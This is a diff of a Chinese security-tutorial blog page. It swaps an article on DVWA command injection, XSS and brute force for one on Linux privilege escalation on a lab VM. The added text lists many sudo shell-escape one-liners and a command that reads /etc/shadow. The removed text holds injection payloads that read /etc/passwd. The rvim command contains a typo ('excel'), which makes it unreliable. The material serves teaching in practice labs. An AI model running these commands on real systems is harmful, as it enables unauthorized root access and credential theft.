@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="了解如何使用暴力破解，命令执行漏洞和XSS漏洞">
-<title>1.6 其他基础web漏洞介绍</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 第一部分中将会使用到kali攻击机和linux靶机（在资源库的安全靶场类中linsec.ova中下载）\n其中，靶机默认用户名：bob，密码：secret（账户权限：普通）\n为了方便操作，我们使用攻击机对靶机进行ssh连接：\n1 ssh bob@[靶机ip] Linux提权 直接提权 1 sudo su 切换到ash终端 ash（Almquist Shell）是一种轻量级的Unix/Linux命令行解释器，主要用于执行命令和管理文件系统。\n1 sudo ash 使用awk命令 1 sudo awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39; 切换到bash终端 1 sudo bash 切换到csh终端 1 sudo csh curl读取shadow获取加密后的密码（穷举破解） 1 sudo curl file:///etc/shadow 切换到dash终端（小型设备适用） 1 sudo dash ed文本编辑器（一次只能编辑一行） 1 2 sudo ed !/bin/sh\t发现输出内容和命令行类似，可以直接当作终端使用 env查询环境变量同时执行sh（顺手的事） 1 sudo env /bin/sh expect自动化脚本 1 sudo expect -c &#39;spawn /bin/sh;interact&#39; find查找同时执行sh（顺手的事*2） 1 sudo find . -exec /bin/sh \\; -quit ftp协议 1 2 sudo ftp !/bin/sh less/more查看（顺手的事*3） 1 2 3 4 5 sudo less /etc/passwd\t或\tsudo more /etc/passwd !/bin/sh man文档查看 1 2 sudo man man !/bin/sh socat网络工具 1 sudo socat stdin exec:/bin/sh ssh连接 1 sudo ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x vi文本编辑器 1 sudo vi -c &#39;:!/bin/sh&#39; /dev/null 切换到zsh终端 1 sudo zsh pico 1 2 3 sudo pico ^R^X(Ctrl+R Ctrl+X) reset; sh 1&gt;&amp;0 2&gt;&amp;0 rvim文本编辑器（适用于有python3的环境） 1 sudo rvim -c &#39;:python3 import os; os.excel(&#34;/bin/sh&#34;,&#34;sh&#34;,&#34;-c&#34;,&#34;reset; exec sh&#34;)&#39; perl 1 sudo perl -e &#39;exec &#34;/bin/sh&#34;;&#39; tclsh 1 2 sudo tclsh exec /bin/sh &lt;@stdin &gt;@stdout 2&gt;@stderr git 1 2 sudo git -p help config !/bin/sh script 1 sudo script -q /dev/null taskset 1 sudo taskset 1 /bin/sh -p 密码破解 查看/etc/passwd文件\n">
+<title>1.10 Linux提权和密码破解</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/1.6-%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/1.10-linux%E6%8F%90%E6%9D%83%E5%92%8C%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/'>
 
-<link rel="stylesheet" href="/scss/style.min.cdfea7edd08f20a450e32e39a442d404d324012e6a68d984ad7ca649217d9edf.css"><meta property='og:title' content="1.6 其他基础web漏洞介绍">
-<meta property='og:description' content="了解如何使用暴力破解，命令执行漏洞和XSS漏洞">
-<meta property='og:url' content='https://www.retr0.xyz/p/1.6-%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/'>
+<link rel="stylesheet" href="/scss/style.min.cdfea7edd08f20a450e32e39a442d404d324012e6a68d984ad7ca649217d9edf.css"><meta property='og:title' content="1.10 Linux提权和密码破解">
+<meta property='og:description' content=" 第一部分中将会使用到kali攻击机和linux靶机（在资源库的安全靶场类中linsec.ova中下载）\n其中，靶机默认用户名：bob，密码：secret（账户权限：普通）\n为了方便操作，我们使用攻击机对靶机进行ssh连接：\n1 ssh bob@[靶机ip] Linux提权 直接提权 1 sudo su 切换到ash终端 ash（Almquist Shell）是一种轻量级的Unix/Linux命令行解释器，主要用于执行命令和管理文件系统。\n1 sudo ash 使用awk命令 1 sudo awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39; 切换到bash终端 1 sudo bash 切换到csh终端 1 sudo csh curl读取shadow获取加密后的密码（穷举破解） 1 sudo curl file:///etc/shadow 切换到dash终端（小型设备适用） 1 sudo dash ed文本编辑器（一次只能编辑一行） 1 2 sudo ed !/bin/sh\t发现输出内容和命令行类似，可以直接当作终端使用 env查询环境变量同时执行sh（顺手的事） 1 sudo env /bin/sh expect自动化脚本 1 sudo expect -c &#39;spawn /bin/sh;interact&#39; find查找同时执行sh（顺手的事*2） 1 sudo find . -exec /bin/sh \\; -quit ftp协议 1 2 sudo ftp !/bin/sh less/more查看（顺手的事*3） 1 2 3 4 5 sudo less /etc/passwd\t或\tsudo more /etc/passwd !/bin/sh man文档查看 1 2 sudo man man !/bin/sh socat网络工具 1 sudo socat stdin exec:/bin/sh ssh连接 1 sudo ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x vi文本编辑器 1 sudo vi -c &#39;:!/bin/sh&#39; /dev/null 切换到zsh终端 1 sudo zsh pico 1 2 3 sudo pico ^R^X(Ctrl+R Ctrl+X) reset; sh 1&gt;&amp;0 2&gt;&amp;0 rvim文本编辑器（适用于有python3的环境） 1 sudo rvim -c &#39;:python3 import os; os.excel(&#34;/bin/sh&#34;,&#34;sh&#34;,&#34;-c&#34;,&#34;reset; exec sh&#34;)&#39; perl 1 sudo perl -e &#39;exec &#34;/bin/sh&#34;;&#39; tclsh 1 2 sudo tclsh exec /bin/sh &lt;@stdin &gt;@stdout 2&gt;@stderr git 1 2 sudo git -p help config !/bin/sh script 1 sudo script -q /dev/null taskset 1 sudo taskset 1 /bin/sh -p 密码破解 查看/etc/passwd文件\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.10-linux%E6%8F%90%E6%9D%83%E5%92%8C%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/'>
 <meta property='og:site_name' content='Retr0的小窝'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-30T14:10:19&#43;08:00'/><meta property='article:modified_time' content='2025-11-30T14:10:19&#43;08:00'/>
-<meta name="twitter:title" content="1.6 其他基础web漏洞介绍">
-<meta name="twitter:description" content="了解如何使用暴力破解，命令执行漏洞和XSS漏洞">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-09T16:18:30&#43;08:00'/><meta property='article:modified_time' content='2025-12-09T16:18:30&#43;08:00'/>
+<meta name="twitter:title" content="1.10 Linux提权和密码破解">
+<meta name="twitter:description" content=" 第一部分中将会使用到kali攻击机和linux靶机（在资源库的安全靶场类中linsec.ova中下载）\n其中，靶机默认用户名：bob，密码：secret（账户权限：普通）\n为了方便操作，我们使用攻击机对靶机进行ssh连接：\n1 ssh bob@[靶机ip] Linux提权 直接提权 1 sudo su 切换到ash终端 ash（Almquist Shell）是一种轻量级的Unix/Linux命令行解释器，主要用于执行命令和管理文件系统。\n1 sudo ash 使用awk命令 1 sudo awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39; 切换到bash终端 1 sudo bash 切换到csh终端 1 sudo csh curl读取shadow获取加密后的密码（穷举破解） 1 sudo curl file:///etc/shadow 切换到dash终端（小型设备适用） 1 sudo dash ed文本编辑器（一次只能编辑一行） 1 2 sudo ed !/bin/sh\t发现输出内容和命令行类似，可以直接当作终端使用 env查询环境变量同时执行sh（顺手的事） 1 sudo env /bin/sh expect自动化脚本 1 sudo expect -c &#39;spawn /bin/sh;interact&#39; find查找同时执行sh（顺手的事*2） 1 sudo find . -exec /bin/sh \\; -quit ftp协议 1 2 sudo ftp !/bin/sh less/more查看（顺手的事*3） 1 2 3 4 5 sudo less /etc/passwd\t或\tsudo more /etc/passwd !/bin/sh man文档查看 1 2 sudo man man !/bin/sh socat网络工具 1 sudo socat stdin exec:/bin/sh ssh连接 1 sudo ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x vi文本编辑器 1 sudo vi -c &#39;:!/bin/sh&#39; /dev/null 切换到zsh终端 1 sudo zsh pico 1 2 3 sudo pico ^R^X(Ctrl+R Ctrl+X) reset; sh 1&gt;&amp;0 2&gt;&amp;0 rvim文本编辑器（适用于有python3的环境） 1 sudo rvim -c &#39;:python3 import os; os.excel(&#34;/bin/sh&#34;,&#34;sh&#34;,&#34;-c&#34;,&#34;reset; exec sh&#34;)&#39; perl 1 sudo perl -e &#39;exec &#34;/bin/sh&#34;;&#39; tclsh 1 2 sudo tclsh exec /bin/sh &lt;@stdin &gt;@stdout 2&gt;@stderr git 1 2 sudo git -p help config !/bin/sh script 1 sudo script -q /dev/null taskset 1 sudo taskset 1 /bin/sh -p 密码破解 查看/etc/passwd文件\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -319,38 +319,37 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#靶场的获取与配置">靶场的获取与配置</a></li>
-    <li><a href="#靶场的使用">靶场的使用</a>
+    <li><a href="#linux提权">Linux提权</a>
       <ol>
-        <li><a href="#暴力破解-brute-force">暴力破解 Brute Force</a></li>
+        <li><a href="#直接提权">直接提权</a></li>
+        <li><a href="#切换到ash终端"><strong>切换到ash终端</strong></a></li>
+        <li><a href="#使用awk命令">使用awk命令</a></li>
+        <li><a href="#切换到bash终端">切换到bash终端</a></li>
+        <li><a href="#切换到csh终端">切换到csh终端</a></li>
+        <li><a href="#curl读取shadow获取加密后的密码穷举破解">curl读取shadow获取加密后的密码（穷举破解）</a></li>
+        <li><a href="#切换到dash终端小型设备适用">切换到dash终端（小型设备适用）</a></li>
+        <li><a href="#ed文本编辑器一次只能编辑一行">ed文本编辑器（一次只能编辑一行）</a></li>
+        <li><a href="#env查询环境变量同时执行sh顺手的事">env查询环境变量同时执行sh（顺手的事）</a></li>
+        <li><a href="#expect自动化脚本">expect自动化脚本</a></li>
+        <li><a href="#find查找同时执行sh顺手的事2">find查找同时执行sh（顺手的事*2）</a></li>
+        <li><a href="#ftp协议">ftp协议</a></li>
+        <li><a href="#lessmore查看顺手的事3">less/more查看（顺手的事*3）</a></li>
+        <li><a href="#man文档查看">man文档查看</a></li>
+        <li><a href="#socat网络工具">socat网络工具</a></li>
+        <li><a href="#ssh连接">ssh连接</a></li>
+        <li><a href="#vi文本编辑器">vi文本编辑器</a></li>
+        <li><a href="#切换到zsh终端">切换到zsh终端</a></li>
+        <li><a href="#pico">pico</a></li>
+        <li><a href="#rvim文本编辑器适用于有python3的环境">rvim文本编辑器（适用于有python3的环境）</a></li>
+        <li><a href="#perl">perl</a></li>
+        <li><a href="#tclsh">tclsh</a></li>
+        <li><a href="#git">git</a></li>
+        <li><a href="#script">script</a></li>
+        <li><a href="#taskset">taskset</a></li>
       </ol>
     </li>
-    <li><a href="#命令注入-command-injection命令执行漏洞">命令注入 Command injection（命令执行漏洞）</a>
-      <ol>
-        <li><a href="#low-低难度">low 低难度</a></li>
-        <li><a href="#high-高难度">high 高难度</a></li>
-        <li><a href="#如果在linux环境下">如果在linux环境下</a></li>
-      </ol>
-    </li>
-    <li><a href="#反射型跨站点脚本xss">反射型跨站点脚本（XSS）</a>
-      <ol>
-        <li><a href="#low-低难度-1">low 低难度</a></li>
-        <li><a href="#medium-中等难度">medium 中等难度</a></li>
-        <li><a href="#high-高难度-1">high 高难度</a></li>
-      </ol>
-    </li>
-    <li><a href="#存储的跨站点脚本xss">存储的跨站点脚本（XSS）</a>
-      <ol>
-        <li><a href="#low-低难度-2">low 低难度</a></li>
-        <li><a href="#medium-中等难度-1">medium 中等难度</a></li>
-        <li><a href="#high-高难度-2">high 高难度</a></li>
-      </ol>
-    </li>
-    <li><a href="#跨站请求伪造-csrf">跨站请求伪造 (CSRF)</a>
-      <ol>
-        <li><a href="#low-低难度-3">low 低难度</a></li>
-      </ol>
-    </li>
+    <li><a href="#密码破解">密码破解</a></li>
+    <li><a href="#tar命令注入">tar命令注入</a></li>
   </ol>
 </nav>
         </div>
@@ -382,13 +381,9 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/1.6-%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/">1.6 其他基础web漏洞介绍</a>
+            <a href="/p/1.10-linux%E6%8F%90%E6%9D%83%E5%92%8C%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">1.10 Linux提权和密码破解</a>
         </h2>
     
-        
-        <h3 class="article-subtitle">
-            了解如何使用暴力破解，命令执行漏洞和XSS漏洞
-        </h3>
         
     </div>
 
@@ -408,7 +403,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-11-30</time>
+                <time class="article-time--published">2025-12-09</time>
             </div>
         
 
@@ -432,186 +427,328 @@
     
     
     <blockquote>
-<p>本篇文章如未特别强调，均使用提供的Win10进行实验</p>
+<p>第一部分中将会使用到kali攻击机和linux靶机（在资源库的<font style="color:rgb(0, 0, 0);">安全靶场类中linsec.ova中下载</font>）</p>
 </blockquote>
-<h2 id="靶场的获取与配置">靶场的获取与配置
-</h2><p>本篇内容基于dvwa靶场，文件已经放在文章<a class="link" href="https://www.retr0.xyz/p/0.%E5%AE%89%E5%85%A8%E7%B1%BB%E5%B7%A5%E5%85%B7%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E5%BA%93/"  target="_blank" rel="noopener"
-    >0.安全类工具文件资源库</a>中了，这里再贴出来一次</p>
-<p>链接：</font><a class="link" href="https://pan.baidu.com/s/1dmU9DcXAthjY0te4qv4tAg"  target="_blank" rel="noopener"
-    ><font style="color:rgb(0, 184, 119);">https://pan.baidu.com/s/1dmU9DcXAthjY0te4qv4tAg</font></a>
-提取码：38mj</p>
-<p>下载得到<code>dvwa汉化版.zip</code>，将压缩包里<code>dvwa</code>文件夹里的文件解压到<code>C:\phpstudy_pro\WWW</code>中，注意提前将<font style="color:#DF2A3F;">phpmyadmin以外</font>的其他文件删除</p>
-<hr>
-<ol>
-<li>打开phpstudy，在“网站”菜单中的“管理”处设置php版本为<code>5.6.x</code>;</li>
-<li>到“设置”-“配置文件”中点击你上面选择的php版本打开配置文件</li>
-<li>使用Ctrl+F搜索<code>allow_url_fopen</code>和<code>allow_url_include</code>确保这两项后面的配置都是<code>On</code>，保存文件</li>
-<li>回到首页，启动Apache和MySQL，打开FireFox浏览器访问<code>127.0.0.1</code>，点击下面的 |创建/重置数据库| 按钮</li>
-<li>登录，用户名为：<code>admin</code>，密码为：<code>password</code></li>
-<li>在DVWA安全页面里设置安全等级为low</li>
-</ol>
-<h2 id="靶场的使用">靶场的使用
-</h2><p>提前配置好抓包环境并打开burp suite，详见<a class="link" href="https://www.retr0.xyz/p/1.1-%E6%8A%93%E5%8C%85%E5%92%8Cweb%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"  target="_blank" rel="noopener"
-    >1.1 抓包和web基本知识</a></p>
-<p>小贴士：可以在phpstudy目录下新建test.php用来测试代码中看不懂的部分</p>
-<h3 id="暴力破解-brute-force">暴力破解 Brute Force
-</h3><p>打开dvwa中暴力破解页面，可以点击右下角查看源代码简单分析功能如何实现</p>
-<ol>
-<li>现在随便输入用户名和密码（以分别为admin；123为例），同时启用抓包，点击“登陆”，发现已经抓到相应数据包，右键空白处点击“Send to Intruder&quot;后放行数据包</li>
-<li>转到Intruder-Positions页面，这里需要我们设置要暴力破解哪个部分，我们先点击<code>Clear§</code>，然后选中密码部分（也就是123），点击<code>add§</code>,Attack Type选择sniper</li>
-<li>转到Payloads选项中，可以在Payloads Options中添加可能的密码或直接导入字典</li>
-<li>点击Start attack等待攻击完成提示Finished</li>
-<li>点击Length按照长度排序，发现“password”的长度明显与其他不同，说明password是正确密码</li>
-</ol>
-<details class="lake-collapse"><summary id="u0d490cef"><strong><span class="ne-text">补充1(点击展开)：</span></strong></summary><p id="u09e9fb60" class="ne-p"><span class="ne-text">不同的攻击模式：</span></p><ul class="ne-ul"><li id="udc9315e9" data-lake-index-type="0"><strong><span class="ne-text">sniper 模式[单向爆破]</span></strong><span class="ne-text"> 知道用户名不知道密码的情况，破解一些单一的输入框</span></li><li id="ue535ab34" data-lake-index-type="0"><strong><span class="ne-text">battering ram 模式[并发攻击]</span></strong><span class="ne-text"> 对多个目标进行单一的payload攻击，也就是用户名和密码一致</span></li><li id="u9ec15bf0" data-lake-index-type="0"><strong><span class="ne-text">pitchfork 模式[交叉攻击(撞库)] </span></strong><span class="ne-text">有几个变量就可以选几个字典，从字典中随机抽取穷举</span></li><li id="u3fb2f0aa" data-lake-index-type="0"><strong><span class="ne-text">cluster bomb 模式[完整爆破] </span></strong><span class="ne-text">从字典中挨个抽取尝试</span></li></ul></details>
-<h2 id="命令注入-command-injection命令执行漏洞">命令注入 Command injection（命令执行漏洞）
-</h2><blockquote>
-<p>所谓命令执行漏洞就是说一个地方可以执行操作系统的命令</p>
-</blockquote>
-<h3 id="low-低难度">low 低难度
-</h3><p>打开dvwa中命令注入页面，可以点击右下角查看源代码简单分析功能如何实现</p>
-<details class="lake-collapse"><summary id="u379e3f46"><strong><span class="ne-text">补充2(点击展开)：</span></strong></summary><p id="ub9fb94c3" class="ne-p"><span class="ne-text">在Windows CMD中可以通过</span><code class="ne-code"><span class="ne-text">&amp;、&amp;&amp;</span></code><span class="ne-text">符号同时输入并执行两条指令，其他也有</span><code class="ne-code"><span class="ne-text">|、||</span></code><span class="ne-text">等在特定条件下可用</span></p><p id="u8c44826e" class="ne-p"><span class="ne-text">例如执行</span><code class="ne-code"><span class="ne-text">ping www.retr0.xyz &amp; ipconfig</span></code><span class="ne-text">，输出</span></p><pre data-language="plain" id="wvxQd" class="ne-codeblock language-plain"><code>正在 Ping www.retr0.xyz [104.21.69.83] 具有 32 字节的数据:
-来自 104.21.69.83 的回复: 字节=32 时间=211ms TTL=128
-来自 104.21.69.83 的回复: 字节=32 时间=202ms TTL=128
-来自 104.21.69.83 的回复: 字节=32 时间=200ms TTL=128
-来自 104.21.69.83 的回复: 字节=32 时间=201ms TTL=128
-104.21.69.83 的 Ping 统计信息:
-    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，
-往返行程的估计时间(以毫秒为单位):
-    最短 = 200ms，最长 = 211ms，平均 = 203ms
-Windows IP 配置
-以太网适配器 Ethernet0:
-   连接特定的 DNS 后缀 . . . . . . . : localdomain
-   本地链接 IPv6 地址. . . . . . . . : fe80::9087:a026:a5bf:e1c5%12
-   IPv4 地址 . . . . . . . . . . . . : 192.168.80.134
-   子网掩码  . . . . . . . . . . . . : 255.255.255.0
-   默认网关. . . . . . . . . . . . . : 192.168.80.2</code></pre></details>
-我们直接填入`127.0.0.1 & ipconfig`即可
-<h3 id="high-高难度">high 高难度
-</h3><p>现在我们加大难度为high，重新查看源代码发现多出了过滤机制</p>
+<p>其中，靶机默认用户名：bob，密码：secret（账户权限：普通）</p>
+<p>为了方便操作，我们使用攻击机对靶机进行ssh连接：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Set blacklist
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$substitutions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&amp;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;| &#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;-&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;$&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;(&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;)&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;`&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;||&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ssh bob@[靶机ip]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="linux提权">Linux提权
+</h2><h3 id="直接提权">直接提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo su
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="切换到ash终端"><strong>切换到ash终端</strong>
+</h3><blockquote>
+<p>ash（Almquist Shell）是一种轻量级的Unix/Linux命令行解释器，主要用于执行命令和管理文件系统。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo ash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="使用awk命令">使用awk命令
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="切换到bash终端">切换到bash终端
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="切换到csh终端">切换到csh终端
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo csh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="curl读取shadow获取加密后的密码穷举破解">curl读取shadow获取加密后的密码（穷举破解）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo curl file:///etc/shadow
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="切换到dash终端小型设备适用">切换到dash终端（小型设备适用）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo dash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ed文本编辑器一次只能编辑一行">ed文本编辑器（一次只能编辑一行）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo ed
+</span></span><span class="line"><span class="cl">!/bin/sh		发现输出内容和命令行类似，可以直接当作终端使用
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="env查询环境变量同时执行sh顺手的事">env查询环境变量同时执行sh（顺手的事）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo env /bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="expect自动化脚本">expect自动化脚本
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo expect -c &#39;spawn /bin/sh;interact&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="find查找同时执行sh顺手的事2">find查找同时执行sh（顺手的事*2）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo find . -exec /bin/sh \; -quit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ftp协议">ftp协议
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo ftp
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="lessmore查看顺手的事3">less/more查看（顺手的事*3）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo less /etc/passwd		
+</span></span><span class="line"><span class="cl">或	 
+</span></span><span class="line"><span class="cl">sudo more /etc/passwd
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1">// Remove any of the charactars in the array (blacklist).
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">array_keys</span><span class="p">(</span> <span class="nv">$substitutions</span> <span class="p">),</span> <span class="nv">$substitutions</span><span class="p">,</span> <span class="nv">$target</span> <span class="p">);</span> 
+</span></span><span class="line"><span class="cl">!/bin/sh
 </span></span></code></pre></td></tr></table>
 </div>
-</div><details class="lake-collapse"><summary id="u2313980e"><strong><span class="ne-text">补充3(点击展开)：</span></strong></summary><p id="u5ff13468" class="ne-p"><span class="ne-text">str_replace的用法：str_replace(&quot;要换的字符串&quot;,&quot;替换为&quot;,作用于哪个变量)，例如：</span></p><pre data-language="php" id="EylAn" class="ne-codeblock language-php"><code>&lt;?php
-$a = $_GET['username'];
-$b = str_replace('t','x',$a);
-echo $b;
-?&gt;  </code></pre><p id="u9f0eeedd" class="ne-p"><span class="ne-text">打开url:</span><span class="ne-text" style="text-decoration: underline">http://127.0.0.1/test.php?username=retr0</span><span class="ne-text">，返回 rexr0</span></p><p id="u3ffb944b" class="ne-p"><strong><span class="ne-text"></span></strong></p></details>
-<p><strong>漏洞解析：</strong> 观察发现屏蔽名单中&rsquo;| &lsquo;为一个管道符加一个空格，因此我们填入<code>127.0.0.1 |ipconfig</code>即可</p>
-<h3 id="如果在linux环境下">如果在linux环境下
-</h3><p><code>ping 127.0.0.1 &amp; cat /etc/passwd</code>		几乎同时执行</p>
-<p><code>ping 127.0.0.1 &amp;&amp; cat /etc/passwd</code>	执行完左边去执行右面</p>
-<p><code>ping 127.0.0.1 | cat /etc/passwd</code>		只执行右面</p>
